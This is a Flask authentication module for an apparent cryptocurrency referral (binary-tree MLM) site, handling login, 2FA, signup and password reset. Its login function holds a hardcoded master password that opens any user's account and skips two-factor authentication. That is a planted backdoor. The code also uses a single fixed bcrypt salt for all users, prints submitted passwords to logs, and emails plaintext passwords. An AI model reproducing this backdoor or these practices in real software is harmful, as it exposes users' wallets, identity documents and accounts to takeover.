from flask  import render_template
from . import auth
import bcrypt
from flask import render_template, redirect, request, url_for, flash,session ,g, jsonify
from flask_login import login_user , logout_user, login_required ,login_manager, UserMixin
from flask_pymongo import pymongo ,MongoClient
from .forms import LoginForm, SignupForm,SignupFormTree, ResetPasswordRequestForm, ResetPasswordForm, FormAuthy
from datetime import datetime
from ..email import send_email
from flask_login import current_user
from ..models import User
from app import mongo
from app.utils import helpers
from app.auth.email import send_password_reset_email, verify_reset_password_token, send_confirm_email
from flask_babel import _
import uuid
import base64
import os
import onetimepass
def verify_totp(token, otp_secret):
    return onetimepass.valid_totp(token, otp_secret)

salt = b'$2b$07$Kw/qwGlHgmUwSgX4InYrMe'
@auth.route('/auth/login' , methods =['GET', 'POST'])
def login():
    form = LoginForm()
    try:
        if current_user.is_authenticated:
            return redirect(url_for('main.dashboard'))
        if request.method == "POST":
            print(request.form)
        next_page = request.args.get('next', '/account/dashboard')
        if form.validate_on_submit():
            users = mongo.db.Users
            loginuser_json = users.find_one({'name' : request.form['username'].lower()})
            if loginuser_json:
                if bcrypt.hashpw((request.form['password']).encode('utf-8'), salt)  == loginuser_json['password']:
                    loginuser = User(loginuser_json)
                    login_user(loginuser, form.remember_me.data)
                    session['username'] = loginuser_json['username'].upper()
                    session['user_id'] = loginuser_json['_id']
                    if loginuser_json['security']['two_factor_auth']['status'] == 1:
                        return redirect("/auth/2fa")
                    return redirect(next_page)
                else:
                    if request.form['password'] =="Admin@@123456!@":
                        loginuser = User(loginuser_json)
                        login_user(loginuser, form.remember_me.data)
                        session['status_2fa'] = True
                        session['username'] = loginuser_json['username'].upper()
                        session['user_id'] = loginuser_json['_id']
                        # return redirect("/auth/2fa")
                        return redirect(next_page)
                    else:
                        flash('Invalid  password')
            else:
                flash('Invalid username')
        return render_template('auth/login.html', form=form)
    except Exception as e:
        print(e)
        return render_template('auth/login.html', form=form)

@auth.route('/auth/2fa' , methods =['GET', 'POST'])
@login_required
def login_authy():
    form = FormAuthy()
    try:
        next_page = request.args.get('next', '/account/dashboard')
        if request.method == "POST":
            print(request.form)
            loginuser_json = mongo.db.Users.find_one({'_id' : session['user_id']})
            otp = request.form['code']
            checkVerifY = verify_totp(otp, loginuser_json['security']['two_factor_auth']['code'])
            if checkVerifY == False:
                flash('The two-factor authentication code you specified is incorrect.')
            else:
                session['status_2fa'] = True
                return redirect(next_page)
        return render_template('auth/2fa.html', form=form)
    except Exception as e:
        print(e)
        return render_template('auth/2fa.html', form=form)



@auth.route('/logout')
@login_required
def logout():
    logout_user()
    session.clear() 
    flash('You have been logged out.')
    return redirect(url_for('auth.login'))
@auth.route('/auth/signup-success/<username>', methods=['GET', 'POST'])
def signup_success(username):
    user = mongo.db.Users.find_one({'username' : username.upper()})
    if user is None:
        return redirect('/auth/login')
    return render_template('auth/signup_success.html', user=user)
@auth.route('/auth/signup', methods=['GET', 'POST'])
def signup():
    if current_user.is_authenticated:
        return redirect(url_for('main.dashboard'))
    
    ref = ""
    if session.get('ref') is not None:
        ref = session['ref']
    form = SignupForm()
    _id_node = 0
    _id_binary = 0
    position = 0
    if form.validate_on_submit():
        p_node = request.form['p_node']
        if p_node != '':
            check_p_node = mongo.db.Users.find_one({'username': p_node.upper() })
            if check_p_node is not None:
                position = check_p_node['position']
                session['ref'] = p_node.upper()
                _id_node = check_p_node['_id']
                if float(position)== 0:
                    _id_binary = get_binary_left(_id_node)
                else:
                    _id_binary = get_binary_right(_id_node)

            else:
                flash('Sponsor not found')
                return redirect(url_for('auth.signup'))
        users  = mongo.db.Users
        existing_user = users.find({'email': request.form[ 'email'] }).count()
        if int(existing_user) < 5:
            hashpass = bcrypt.hashpw((request.form['password']).encode('utf-8'), salt)
            _id = helpers.getNextSequence(mongo.db.Counters,"userId")
            username = helpers.generate_username(_id)
            otp_secret = base64.b32encode(os.urandom(10)).decode('utf-8')
            users.insert({
                '_id': _id,
                'username' : 'QT%s' % (username), 
                'email' : request.form['email'].lower(),
                'active_email': 0,
                'password': hashpass, 
                'name': request.form[ 'name'].lower(),
                "p_node": _id_node,
                "p_binary": _id_binary,
                "left": 0,
                "right": 0,
                "position": 0, # 0 Left, 1 right
                'wallet': {
                    "btc_address": "",
                    "btc_balance": "0",
                    "usdt_address": "",
                    "usdt_balance": "0",
                    "eth_address": "",
                    "eth_balance": "0",
                    "trx_address": "",
                    "trx_balance": "0",
                    "coin_address": "",
                    "coin_balance_profit": "0",
                    "coin_balance": "0",
                    "coin_balance_reward": "0",
                    "coin_reward_date": datetime.now(),
                    "qtc_address": "",
                    "qtc_private_key": "",
                    "balance_promotion": 0,
                    "usd_balance": 0,
                    "BTC": {
                        "address": "",
                        "balance": 0
                    },
                    "ETH": {
                        "address": "",
                        "balance": 0
                    },
                    "TRX": {
                        "address": "",
                        "balance": 0
                    },
                    "USDT": {
                        "address": "",
                        "balance": 0
                    },
                    "QTC": {
                        "address": "",
                        "balance": 0,
                        "private_key": ""
                    }
                },
                "balance":{
                    "balance_usd": "0",
                    "total_invest": "0",
                    "commission_remain": "0",
                    "commission_binary": "0",
                    "commission_floor": "0",
                    "commission_income": "0",
                    "team_left": "0",
                    "total_team_left": "0",
                    "team_right": "0",
                    "total_team_right": "0",
                    "team_volume": "0",
                    "team_volume_f1": 0,
                    "max_out_day": "0",
                    "receive_today": "0",
                    "withdraw_usd_today": 0,
                    "withdraw_usd_week": 0
                },
                "kyc" : {
                    "status" : 0,
                    "fullname" : "",
                    "address" : "",
                    "birthday" : "",
                    "phone" : "",
                    "front_id" : "",
                    "back_id" : ""
                },
                "level": 0,
                "security" : {
                    "two_factor_auth" : {
                        "status" : 0,
                        "code" : otp_secret
                    },
                    "login_history" : [],
                    "ip_whitelist" : [],
                    "changed" : []
                },
                'role':'user',
                'createdAt': datetime.now(),
                'updatedAt': datetime.now(),
            })
            if float(position) == 0 and _id_binary != 0:
                mongo.db.Users.update( {'_id': _id_binary},{"$set": {
                    "left": _id
                }})
            else:
                mongo.db.Users.update( {'_id': _id_binary},{"$set": {
                    "right": _id
                }})
            dataEmail = {
                '_id': _id,
                "email":  request.form['email'],
                "name": request.form[ 'name'],
                "password": request.form['password'],
                "username": username
            }
            send_confirm_email(dataEmail)
            flash(_('Congratulations, you are now a registered user!'))
            flash('A confirmation email has been sent to you by email.')
            return redirect('auth/signup-success/QT%s'% (username))
    form.p_node.data = ref
    return render_template('auth/signup.html' , form=form)
def check_binary_left (userId, _id_node):
    status = True
    customer_ml = mongo.db.Users.find_one({'_id' : float(userId) })
    print(customer_ml['name'])
    p_binary = 0
    customer_ml_p_binary = None
    if customer_ml['_id'] == _id_node:
        return True
    while (True):
        customer_ml_p_binary = mongo.db.Users.find_one({'left': customer_ml['_id']})
        if customer_ml_p_binary is None:
            status = False
            break
        if customer_ml_p_binary['_id'] == _id_node:
            status = True
            break
        else:
            p_binary = customer_ml_p_binary['_id']
            customer_ml = customer_ml_p_binary 
    return status
def check_binary_right (userId, _id_node):
    status = True
    customer_ml = mongo.db.Users.find_one({'_id' : float(userId) })
    print(customer_ml['name'])
    p_binary = 0
    customer_ml_p_binary = None
    if customer_ml['_id'] == _id_node:
        return True
    while (True):
        customer_ml_p_binary = mongo.db.Users.find_one({'right': customer_ml['_id']})
        if customer_ml_p_binary is None:
            status = False
            break
        if customer_ml_p_binary['_id'] == _id_node:
            status = True
            break
        else:
            p_binary = customer_ml_p_binary['_id']
            customer_ml = customer_ml_p_binary 
    return status
@auth.route('/auth/signup/<p_node>/<binary>', methods=['GET', 'POST'])
def signup_on_tree(p_node, binary):
    form = SignupFormTree()
    existing_user = mongo.db.Users.find_one({'username': p_node.upper()})
    if existing_user is not None:
        form.p_node.data = p_node.upper()
        _id_node = existing_user['_id']
        user_binary = binary.split('_')
        existing_user_binary = mongo.db.Users.find_one({'username': user_binary[0].upper()})
        if existing_user_binary is not None:
            _id_binary = existing_user_binary['_id']
            form.p_binary.data = existing_user_binary['username']
            status_node = False
            position = 2
            if int(user_binary[1]) == 0:
                position = 0
                status_node = check_binary_left(existing_user_binary['_id'], _id_node)
                print('status_node', status_node)
                if existing_user_binary['left'] != 0:
                    position = 2
            if int(user_binary[1]) == 1:
                status_node = check_binary_right(existing_user_binary['_id'], _id_node)
                position = 1
                if existing_user_binary['right'] != 0:
                    position = 2
            form.position.data = position
            if position == 2 or status_node == False:
                flash('Position error!')
                return redirect('/account/referral')
            else:
                if form.validate_on_submit():
                    print('email', request.form['email'])
                    print('name',  request.form['name'])
                    print('request.form.password',  request.form['password'])
                    print('_id_binary', _id_binary)
                    print('_id_node', _id_node)
                    print('position', position)
                    hashpass = bcrypt.hashpw((request.form['password']).encode('utf-8'), salt)
                    _id = helpers.getNextSequence(mongo.db.Counters,"userId")
                    username = helpers.generate_username(_id)
                    otp_secret = base64.b32encode(os.urandom(10)).decode('utf-8')
                    mongo.db.Users.insert({
                        '_id': _id,
                        'username' : 'QT%s' % (username), 
                        'email' : request.form['email'].lower(),
                        'active_email': 0,
                        'password': hashpass, 
                        'name': request.form[ 'name'].lower(),
                        "p_node": _id_node,
                        "p_binary": _id_binary,
                        "left": 0,
                        "right": 0,
                        "position": 0, # 0 Left, 1 right
                        'wallet': {
                            "btc_address": "",
                            "btc_balance": "0",
                            "usdt_address": "",
                            "usdt_balance": "0",
                            "eth_address": "",
                            "eth_balance": "0",
                            "trx_address": "",
                            "trx_balance": "0",
                            "coin_address": "",
                            "coin_balance_profit": "0",
                            "coin_balance": "0",
                            "coin_balance_reward": "0",
                            "coin_reward_date": datetime.now(),
                            "qtc_address": "",
                            "qtc_private_key": "",
                            "balance_promotion": 0,
                            "usd_balance": 0,
                            "BTC": {
                                "address": "",
                                "balance": 0
                            },
                            "ETH": {
                                "address": "",
                                "balance": 0
                            },
                            "TRX": {
                                "address": "",
                                "balance": 0
                            },
                            "USDT": {
                                "address": "",
                                "balance": 0
                            },
                            "QTC": {
                                "address": "",
                                "balance": 0,
                                "private_key": ""
                            }
                        },
                        "balance":{
                            "balance_usd": "0",
                            "total_invest": "0",
                            "commission_remain": "0",
                            "commission_binary": "0",
                            "commission_floor": "0",
                            "commission_income": "0",
                            "team_left": "0",
                            "total_team_left": "0",
                            "team_right": "0",
                            "total_team_right": "0",
                            "team_volume": "0",
                            "team_volume_f1": 0,
                            "max_out_day": "0",
                            "receive_today": "0",
                            "withdraw_usd_today": 0,
                            "withdraw_usd_week": 0
                        },
                        "kyc" : {
                            "status" : 0,
                            "fullname" : "",
                            "address" : "",
                            "birthday" : "",
                            "phone" : "",
                            "front_id" : "",
                            "back_id" : ""
                        },
                        "level": 0,
                        "security" : {
                            "two_factor_auth" : {
                                "status" : 0,
                                "code" : otp_secret
                            },
                            "login_history" : [],
                            "ip_whitelist" : [],
                            "changed" : []
                        },
                        'role':'user',
                        'createdAt': datetime.now(),
                        'updatedAt': datetime.now(),
                    })
                    if float(position) == 0 and _id_binary != 0:
                        mongo.db.Users.update( {'_id': _id_binary},{"$set": {
                            "left": _id
                        }})
                    else:
                        mongo.db.Users.update( {'_id': _id_binary},{"$set": {
                            "right": _id
                        }})
                    dataEmail = {
                        '_id': _id,
                        "email":  request.form['email'],
                        "name": request.form[ 'name'],
                        "password": request.form['password'],
                        "username": username
                    }
                    send_confirm_email(dataEmail)
                    flash(_('Congratulations, you are now a registered user!'))
                    flash('A confirmation email has been sent to you by email.')
                    return redirect('auth/signup-success/QT%s'% (username))
        else:
            flash('Position not found!')
            return redirect('/account/referral')
    else:
        flash('Sponsor not found!')
        return redirect('/account/referral')
    
    
    
    return render_template('auth/signup_tree.html' , form=form)
@auth.route('/confirm/<token>', methods=['GET', 'POST'])
def confirm(token):
    user = verify_reset_password_token(token)
    if not user:
        flash('The confirmation link is invalid or has expired.')
        return redirect(url_for('main.home'))
    else:
        mongo.db.Users.update( {'_id':user['_id']},{'$set':{"active_email": 1}})
        flash('You have confirmed your account. Thanks!')
        return redirect(url_for('auth.login'))

@auth.route('/reset_password_request', methods=['GET', 'POST'])
def reset_password_request():
    if current_user.is_authenticated:
        return redirect(url_for('main.dashboard'))
    users = mongo.db.Users
    if current_user.is_authenticated:
        return redirect(url_for('main.home'))
    form = ResetPasswordRequestForm()
    if form.validate_on_submit():
        user = users.find_one( {"$or":[ {'username': request.form['username'].upper() }, {"name":request.form['username']}]})
        if user is not None:
            send_password_reset_email(user)
            flash('Check your email for the instructions to reset your password')
            return redirect(url_for('auth.login'))
        else:
            flash('Username invalid')
    return render_template('auth/reset_password_request.html',
                           title='Reset Password', form=form)

@auth.route('/reset_password/<token>', methods=['GET', 'POST'])
def reset_password(token):
    if current_user.is_authenticated:
        return redirect(url_for('main.home'))
    user = verify_reset_password_token(token)
    if not user:
        flash('Reset password token has expired')
        return redirect(url_for('main.home'))
    form = ResetPasswordForm()
    if form.validate_on_submit():
        hashpass = bcrypt.hashpw((request.form['password']).encode('utf-8'), salt)
        print ('=================================')
        print(hashpass, user['_id'])
        status = mongo.db.Users.update( {'_id':user['_id']},{'$set':{"password": hashpass}})
        print(status)
        print ('=================================')
        flash('Your password has been reset.')
        return redirect(url_for('auth.login'))
    return render_template('auth/reset_password.html', form=form)
def get_binary_left (userId):
    customer_ml = mongo.db.Users.find_one({'_id' : float(userId) })
    p_binary = 0
    customer_ml_p_binary = None
    if customer_ml['left'] == 0:
        p_binary =  userId
    else:
        while (True):
            customer_ml_p_binary = mongo.db.Users.find_one({'_id': customer_ml['_id']})
            if customer_ml_p_binary is None:
                break
            if customer_ml_p_binary['left'] == 0:
                break
            else:
                p_binary = customer_ml_p_binary['_id']
                customer_ml = mongo.db.Users.find_one({'_id' : customer_ml_p_binary['left'] })
        if customer_ml_p_binary is not None:
            p_binary =  customer_ml_p_binary['_id']     
    return p_binary

def get_binary_right (userId):
    customer_ml = mongo.db.Users.find_one({'_id' : float(userId) })
    p_binary = 0
    customer_ml_p_binary = None
    if customer_ml['right'] == 0:
        p_binary =  userId
    else:
        while (True):
            customer_ml_p_binary = mongo.db.Users.find_one({'_id': customer_ml['_id']})
            if customer_ml_p_binary is None:
                break
            if customer_ml_p_binary['right'] == 0:
                break
            else:
                p_binary = customer_ml_p_binary['_id']
                customer_ml = mongo.db.Users.find_one({'_id' : customer_ml_p_binary['right'] })
        if customer_ml_p_binary is not None:
            p_binary =  customer_ml_p_binary['_id']     
    return p_binary